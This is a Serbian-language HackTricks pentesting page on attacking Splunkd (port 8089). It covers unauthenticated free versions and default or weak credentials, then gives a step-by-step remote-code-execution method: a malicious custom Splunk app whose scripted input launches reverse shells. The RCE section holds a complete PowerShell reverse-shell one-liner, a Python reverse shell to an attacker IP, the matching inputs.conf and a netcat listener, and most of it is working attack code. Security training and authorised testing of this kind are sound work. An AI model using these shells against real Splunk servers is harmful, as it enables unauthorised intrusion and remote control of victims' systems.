# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Osnovne informacije**

Splunk je **alat za analizu logova** koji igra kljuƒçnu ulogu u **prikupljanju, analizi i vizualizaciji podataka**. Iako njegova prvobitna svrha nije bila da slu≈æi kao **SIEM (alat za upravljanje bezbednosnim informacijama i dogaƒëajima)**, stekao je popularnost u oblasti **bezbednosnog nadzora** i **poslovne analitike**.

Splunk implementacije se ƒçesto koriste za skladi≈°tenje **osetljivih podataka** i mogu poslu≈æiti kao **vredan izvor informacija** za potencijalne napadaƒçe ako uspeju da kompromituju sistem. **Podrazumevani port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web server po defaultu radi na portu 8000**.
{% endhint %}

## Enumeracija

### Besplatna verzija

Splunk Enterprise probna verzija se pretvara u **besplatnu verziju nakon 60 dana**, koja **ne zahteva autentifikaciju**. Nije neobiƒçno da sistemski administratori instaliraju probnu verziju Splunka da bi je testirali, koja je **naknadno zaboravljena**. Ovo ƒáe se automatski pretvoriti u besplatnu verziju koja nema nikakvu formu autentifikacije, uvodeƒái sigurnosnu rupu u okru≈æenje. Neke organizacije mogu izabrati besplatnu verziju zbog bud≈æetskih ograniƒçenja, ne razumevajuƒái u potpunosti posledice nedostatka upravljanja korisnicima/ulogama.

### Podrazumevani kredencijali

Na starijim verzijama Splunka, podrazumevani kredencijali su **`admin:changeme`**, koji su zgodno prikazani na stranici za prijavu.\
Meƒëutim, **najnovija verzija Splunka** postavlja **kredencijale** **tokom procesa instalacije**. Ako podrazumevani kredencijali ne rade, vredi proveriti uobiƒçajene slabe lozinke kao ≈°to su `admin`, `Welcome`, `Welcome1`, `Password123`, itd.

### Dobijanje informacija

Jednom kada se prijavimo u Splunk, mo≈æemo **pregledati podatke**, pokrenuti **izve≈°taje**, kreirati **kontrolne table**, **instalirati aplikacije** iz Splunkbase biblioteke i instalirati prilagoƒëene aplikacije.\
Takoƒëe mo≈æete pokrenuti kod: Splunk ima vi≈°e naƒçina za **pokretanje koda**, kao ≈°to su aplikacije na serveru zasnovane na Djangou, REST krajnje taƒçke, skriptovani ulazi i skripte za upozorenje. Uobiƒçajena metoda za dobijanje daljinskog izvr≈°avanja koda na Splunk serveru je kori≈°ƒáenje skriptovanog ulaza.

Pored toga, kako se Splunk mo≈æe instalirati na Windows ili Linux hostove, skriptovani ulazi se mogu kreirati za pokretanje Bash, PowerShell ili Batch skripti.

### Shodan

* `Splunk build`

## RCE

### Kreiranje prilagoƒëene aplikacije

Prilagoƒëena aplikacija mo≈æe pokretati **Python, Batch, Bash ili PowerShell skripte**.\
Napomena: **Splunk dolazi sa instaliranim Pythonom**, tako da ƒçak i na **Windows** sistemima mo≈æete pokretati python kod.

Mo≈æete koristiti [**ovu**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paket da nam pomogne. **`bin`** direktorijum u ovom repozitorijumu ima primere za [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Proƒëimo kroz ovo korak po korak.

Da bismo to postigli, prvo treba da kreiramo prilagoƒëenu Splunk aplikaciju koristeƒái sledeƒáu strukturu direktorijuma:
```shell-session
tree splunk_shell/

splunk_shell/
‚îú‚îÄ‚îÄ bin
‚îî‚îÄ‚îÄ default
```
Direktorija **`bin`** ƒáe sadr≈æati sve **skripte koje nameravamo da pokrenemo** (u ovom sluƒçaju, **PowerShell** reverzni shell), a podrazumevana direktorija ƒáe imati na≈° `inputs.conf` fajl. Na≈° reverzni shell ƒáe biti **PowerShell one-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Fajl [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) govori Splunk-u **koji skript da pokrene** i sve druge uslove. Ovde postavljamo aplikaciju kao omoguƒáenu i govorimo Splunk-u da pokrene skript svake 10 sekundi. Interval je uvek u sekundama, a ulaz (skript) ƒáe se pokrenuti samo ako je ova postavka prisutna.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Potrebna nam je `.bat` datoteka, koja ƒáe se pokrenuti kada se aplikacija implementira i izvr≈°iti PowerShell jednosmernu komandu.

Sledeƒái korak je da izaberemo `Install app from file` i otpremimo aplikaciju.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Pre nego ≈°to otpremimo zlu prilagoƒëenu aplikaciju, hajde da pokrenemo slu≈°alac koristeƒái Netcat ili [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na stranici `Upload app`, kliknite na browse, izaberite tarball koji smo ranije kreirali i kliknite na `Upload`. ƒåim **otpremimo aplikaciju**, **dobijamo reverse shell** jer ƒáe status aplikacije automatski biti prebaƒçen na `Enabled`.

#### Linux

Ako bismo se bavili **Linux hostom**, morali bismo **izmeniti `rev.py` Python skript** pre nego ≈°to kreiramo tarball i otpremimo prilagoƒëenu malicioznu aplikaciju. Ostatak procesa bi bio isti, i dobili bismo reverse shell vezu na na≈°em Netcat slu≈°atelju i krenuli u akciju.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

Na sledeƒáoj stranici mo≈æete pronaƒái obja≈°njenje kako se ova usluga mo≈æe zloupotrebiti za eskalaciju privilegija i dobijanje postojanosti:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
